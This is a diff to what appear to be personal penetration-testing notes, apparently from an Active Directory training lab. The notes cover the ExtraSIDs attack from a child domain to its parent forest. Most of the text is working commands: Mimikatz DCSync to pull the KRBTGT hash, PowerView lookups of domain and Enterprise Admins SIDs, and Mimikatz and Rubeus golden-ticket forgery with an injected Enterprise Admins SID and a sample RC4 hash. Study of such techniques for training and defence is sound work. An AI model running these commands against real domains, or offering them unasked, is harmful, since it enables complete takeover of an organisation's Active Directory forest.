@@ -435,7 +435,7 @@ extraSIDS attack: lets user add an admin account to the SID history attribute of
 
 ### **Mimikatz** 
 
-**KRBTGT hash**
+1.**KRBTGT hash**
 
 ```
 .\mimikatz.exe 
@@ -443,19 +443,34 @@ lsadump::dsync /user:CHILD-DOMAIN-BEGINNING\krbtgt
 #ex if CHILD DOMAIN is PRODUCTS.INLANEFREIGHT.COM, you would write
 PRODUCTS
 ```
+**2.SID for child domain**
 
-SID for child domain 
 ```
 Get-DomainSID #run from within/from the child domain 
 ```
-SID for Enterprise Admins 
+
+3. TARGET USER
+
+```
+hacker 
+```
+4. CHILD-DOMAIN Name
+- already known 
+5. SID for Enterprise Admins
+  
 ```
 Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname, objectsid
 ```
+**Golden ticket creation**
+
+```
 ./mimikatz.exe 
 kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:CHILD-DOMAIN-SID /krbtgt:/KRBTGT-hash /sids:ENTERPRISE-ADMIN-SID /ptt
-
+```
 ### Rubeus 
+
+```
 .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
+```
 
   
